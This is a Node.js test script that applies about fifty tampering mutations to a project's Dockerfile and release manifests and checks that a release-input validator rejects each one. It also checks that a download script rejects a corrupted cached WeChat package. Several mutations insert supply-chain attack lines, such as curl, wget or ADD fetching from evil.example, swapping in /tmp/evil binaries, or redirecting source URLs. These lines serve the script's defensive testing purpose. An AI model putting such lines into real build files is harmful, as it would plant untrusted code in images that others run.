#!/usr/bin/env node
import assert from 'node:assert/strict';
import { mkdtempSync, cpSync, readFileSync, writeFileSync, rmSync, mkdirSync, chmodSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { spawnSync } from 'node:child_process';
const root=resolve(import.meta.dirname,'..');
const run=dir=>spawnSync(process.execPath,['scripts/validate-release-inputs.mjs'],{cwd:dir,encoding:'utf8'});
assert.equal(run(root).status,0);
const replace=(d,path,from,to)=>{const p=join(d,path),s=readFileSync(p,'utf8');assert.ok(s.includes(from),`fixture missing ${from}`);writeFileSync(p,s.replace(from,to));};
const mutations=[
 d=>replace(d,'docker/Dockerfile','FROM rust:1.93-bookworm@sha256:','FROM rust:1.93-bookworm # sha256:'),
 d=>replace(d,'docker/Dockerfile','RUN command -v pkg-config','RUN apt-get update && apt-get install -y pkg-config && command -v pkg-config'),
 d=>replace(d,'docker/Dockerfile','-o Acquire::Retries=5 -o Acquire::http::Timeout=30 -o Acquire::https::Timeout=30 update','update'),
 d=>replace(d,'docker/Dockerfile','COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/ca-certificates.crt','RUN echo pinned-ca-copy'),
 d=>replace(d,'docker/Dockerfile','jammy-security main restricted universe multiverse','jammy-security main restricted universe multiverse\\ndeb http://archive.ubuntu.com/ubuntu jammy main'),
 d=>replace(d,'docker/Dockerfile','RUN pip3 install --require-hashes','RUN pip3 install arbitrary-extra && pip3 install --require-hashes'),
 d=>replace(d,'docker/Dockerfile','"$NOVNC_SHA256  /tmp/novnc.tar.gz" | sha256sum --check --strict','"$NOVNC_SHA256" && echo sha256sum --check --strict'),
 d=>replace(d,'docker/Dockerfile','"$SQLCIPHER_SHA256  sqlcipher.tar.gz" | sha256sum --check --strict','"$SQLCIPHER_SHA256" && echo sha256sum --check --strict'),
 d=>replace(d,'docker/Dockerfile','"$WECHAT_SHA256  /tmp/wechat.deb" | sha256sum --check --strict','"$WECHAT_SHA256" && echo sha256sum --check --strict'),
 d=>replace(d,'docker/Dockerfile','test "$(dpkg-deb -f /tmp/wechat.deb Version)" = "$WECHAT_VERSION"','echo dpkg-deb -f /tmp/wechat.deb Version "$WECHAT_VERSION"'),
 d=>replace(d,'docker/Dockerfile','test "$(dpkg-deb -f /tmp/wechat.deb Architecture)" = "$DEB_ARCH"','echo dpkg-deb -f /tmp/wechat.deb Architecture "$DEB_ARCH"'),
 d=>replace(d,'docker/release-materials/requirements.lock','frida-tools==14.10.4','frida-tools'),
 d=>{const p=join(d,'docker/release-materials/frida_tools-14.10.4-py3-none-any.whl');writeFileSync(p,Buffer.concat([readFileSync(p),Buffer.from('drift')]));},
 d=>replace(d,'docker/Dockerfile','libssl-dev build-essential tcl \\','libssl-dev build-essential tcl telnet \\'),
 d=>replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat','RUN curl https://evil.example/payload -o /tmp/payload\nRUN useradd -m -s /bin/bash wechat'),
 d=>replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat','RUN wget https://evil.example/payload -O /tmp/payload\nRUN useradd -m -s /bin/bash wechat'),
 d=>replace(d,'docker/Dockerfile','COPY entrypoint.sh /entrypoint.sh','ADD https://evil.example/payload /tmp/payload\nCOPY entrypoint.sh /entrypoint.sh'),
 d=>replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat','RUN cp /tmp/evil /usr/local/bin/sqlcipher\nRUN useradd -m -s /bin/bash wechat'),
 d=>replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat','RUN rm -rf /opt/novnc && cp -r /tmp/evil /opt/novnc\nRUN useradd -m -s /bin/bash wechat'),
 d=>replace(d,'docker/Dockerfile','ENV DISPLAY=:99','ENV EVIL_URL=https://evil.example/payload\nENV DISPLAY=:99'),
 d=>replace(d,'docker/release-inputs.json','https://snapshot.ubuntu.com/ubuntu','https://mirror.example/ubuntu'),
 d=>replace(d,'docker/Dockerfile','RUN UBUNTU_SNAPSHOT=20260801T000000Z','ARG UBUNTU_SNAPSHOT=20260801T000000Z\nRUN UBUNTU_SNAPSHOT=20260801T000000Z'),
 d=>replace(d,'docker/Dockerfile','RUN UBUNTU_SNAPSHOT=20260801T000000Z','ARG UBUNTU_SNAPSHOT\nRUN UBUNTU_SNAPSHOT=20260801T000000Z'),
 d=>replace(d,'docker/Dockerfile','RUN UBUNTU_SNAPSHOT=20260801T000000Z','ARG UBUNTU_SNAPSHOT=20990101T000000Z\nRUN UBUNTU_SNAPSHOT="$UBUNTU_SNAPSHOT"'),
 d=>replace(d,'docker/Dockerfile','RUN NOVNC_VERSION=1.5.0','ARG NOVNC_VERSION=1.5.0\nRUN NOVNC_VERSION=1.5.0'),
 d=>replace(d,'docker/Dockerfile','RUN NOVNC_VERSION=1.5.0','ARG NOVNC_URL\nRUN NOVNC_VERSION=1.5.0'),
 d=>replace(d,'docker/Dockerfile','RUN NOVNC_VERSION=1.5.0','RUN NOVNC_VERSION=1.6.0'),
 d=>replace(d,'docker/Dockerfile','NOVNC_URL=https://github.com/novnc/noVNC/archive/refs/tags/v1.5.0.tar.gz','NOVNC_URL=https://evil.example/novnc.tar.gz'),
 d=>replace(d,'docker/Dockerfile','NOVNC_SHA256=6a73e41f98388a5348b7902f54b02d177cb73b7e5eb0a7a0dcf688cc2c79b42a','NOVNC_SHA256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'),
 d=>replace(d,'docker/Dockerfile','RUN SQLCIPHER_VERSION=4.6.1','ARG SQLCIPHER_VERSION\nRUN SQLCIPHER_VERSION=4.6.1'),
 d=>replace(d,'docker/Dockerfile','SQLCIPHER_URL=https://github.com/sqlcipher/sqlcipher/archive/refs/tags/v4.6.1.tar.gz','SQLCIPHER_URL=https://evil.example/sqlcipher.tar.gz'),
 d=>replace(d,'docker/Dockerfile','RUN WECHAT_VERSION=4.1.1.8','ARG WECHAT_VERSION=4.1.1.8\nRUN WECHAT_VERSION=4.1.1.8'),
 d=>replace(d,'docker/Dockerfile','RUN WECHAT_VERSION=4.1.1.8','ARG WECHAT_AMD64_URL\nRUN WECHAT_VERSION=4.1.1.8'),
 d=>replace(d,'docker/Dockerfile','RUN WECHAT_VERSION=4.1.1.8','RUN WECHAT_VERSION=4.1.1.9'),
 d=>replace(d,'docker/Dockerfile','WECHAT_ARM64_SHA256=c3ed1a481247e6a1b166e87a66cccdee898c3ae0b76613b39bb6e9795e50929f','WECHAT_ARM64_SHA256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'),
 d=>replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat','RUN cp /tmp/evil /usr/local/bin/sqlcipher && echo cp sqlcipher /usr/local/bin/sqlcipher\nRUN useradd -m -s /bin/bash wechat'),
 d=>replace(d,'docker/release-inputs.json','\"providedFiles\": [','\"providedFiles\": [\n        \"/tmp/unapproved\",'),
 d=>replace(d,'docker/release-inputs.json','\"pkg-config\": \"1.8.1-1\"','\"pkg-config\": \"1.8.1-1\", \"curl\": \"any\"'),
 d=>{replace(d,'docker/Dockerfile','COPY entrypoint.sh /entrypoint.sh','ADD https://evil.example/payload /tmp/payload\nCOPY entrypoint.sh /entrypoint.sh');const p=join(d,'docker/release-instruction-allowlist.json'),j=JSON.parse(readFileSync(p,'utf8'));j.instructions.splice(-6,0,'ADD https://evil.example/payload /tmp/payload');writeFileSync(p,JSON.stringify(j,null,2)+'\n');},
 d=>{replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat','RUN curl https://evil.example/payload -o /tmp/payload\nRUN useradd -m -s /bin/bash wechat');const p=join(d,'docker/release-instruction-allowlist.json'),j=JSON.parse(readFileSync(p,'utf8')),i=j.instructions.indexOf('RUN useradd -m -s /bin/bash wechat');j.instructions.splice(i,0,'RUN curl https://evil.example/payload -o /tmp/payload');writeFileSync(p,JSON.stringify(j,null,2)+'\n');},
 d=>{replace(d,'docker/Dockerfile','libssl-dev build-essential tcl \\','libssl-dev build-essential tcl telnet \\');const p=join(d,'docker/release-instruction-allowlist.json'),j=JSON.parse(readFileSync(p,'utf8'));j.instructions=j.instructions.map(x=>x.replace('libssl-dev build-essential tcl python3-pip','libssl-dev build-essential tcl telnet python3-pip'));writeFileSync(p,JSON.stringify(j,null,2)+'\n');},
 d=>{replace(d,'docker/Dockerfile','RUN useradd -m -s /bin/bash wechat','COPY tools/sqlcipher /usr/local/bin/sqlcipher\nRUN useradd -m -s /bin/bash wechat');const p=join(d,'docker/release-instruction-allowlist.json'),j=JSON.parse(readFileSync(p,'utf8')),i=j.instructions.indexOf('RUN useradd -m -s /bin/bash wechat');j.instructions.splice(i,0,'COPY tools/sqlcipher /usr/local/bin/sqlcipher');writeFileSync(p,JSON.stringify(j,null,2)+'\n');},
 d=>{const dp=join(d,'docker/Dockerfile'),ap=join(d,'docker/release-instruction-allowlist.json'),m=JSON.parse(readFileSync(join(d,'docker/release-inputs.json'),'utf8')),j=JSON.parse(readFileSync(ap,'utf8'));const b=m.baseImages.builder.reference,r=m.baseImages.runtime.reference;replace(d,'docker/Dockerfile',`FROM ${b} AS builder`,`FROM ${r} AS builder`);replace(d,'docker/Dockerfile',`FROM ${r}`,`FROM ${b}`);j.instructions[0]=`FROM ${r} AS builder`;j.instructions[j.instructions.findIndex(x=>x===`FROM ${r}`)]=`FROM ${b}`;writeFileSync(ap,JSON.stringify(j,null,2)+'\n');},
 d=>replace(d,'docker/release-instruction-allowlist.json','"schemaVersion": 1,','"schemaVersion": 1,\n  "unknown": true,'),
 d=>replace(d,'docker/release-inputs.json','"schemaVersion": 1,','"schemaVersion": 1,\n  "unknown": true,'),
 d=>replace(d,'docker/Dockerfile','# ============================================','# syntax=docker/dockerfile:1\n# ============================================'),
 d=>replace(d,'docker/Dockerfile','# ============================================','# syntax=evil.example/frontend:latest\n# ============================================'),
 d=>replace(d,'docker/Dockerfile','# ============================================','# escape=`\n# ============================================'),
 d=>replace(d,'docker/Dockerfile','# ============================================','# check=skip=all\n# ============================================'),
 d=>replace(d,'docker/release-inputs.json','"schemaVersion": 1,','"schemaVersion": 1,\n  "schemaVersion": 1,'),
 d=>replace(d,'docker/release-instruction-allowlist.json','"schemaVersion": 1,','"schemaVersion": 1,\n  "schemaVersion": 1,'),
];
for(const [index,mutate] of mutations.entries()){const d=mkdtempSync(join(tmpdir(),'release-inputs-'));try{for(const x of ['docker','.github','scripts'])cpSync(join(root,x),join(d,x),{recursive:true});mutate(d);const result=run(d);assert.notEqual(result.status,0,`mutation ${index + 1} escaped validator: ${result.stdout}`);}finally{rmSync(d,{recursive:true,force:true});}}
// Existing cache must be verified before the downloader can report success.
const d=mkdtempSync(join(tmpdir(),'wechat-cache-'));try{mkdirSync(join(d,'scripts'));mkdirSync(join(d,'docker'));cpSync(join(root,'scripts/download-wechat.sh'),join(d,'scripts/download-wechat.sh'));writeFileSync(join(d,'docker/wechat.deb'),'corrupt cache');const bin=join(d,'bin');mkdirSync(bin);writeFileSync(join(bin,'uname'),'#!/bin/sh\necho arm64\n');chmodSync(join(bin,'uname'),0o755);const r=spawnSync('bash',['scripts/download-wechat.sh'],{cwd:d,env:{...process.env,PATH:`${bin}:${process.env.PATH}`},encoding:'utf8'});assert.notEqual(r.status,0,'corrupt cached WeChat payload was accepted');}finally{rmSync(d,{recursive:true,force:true});}
console.log(`${mutations.length} semantic release-input mutations and corrupt cache failed closed.`);
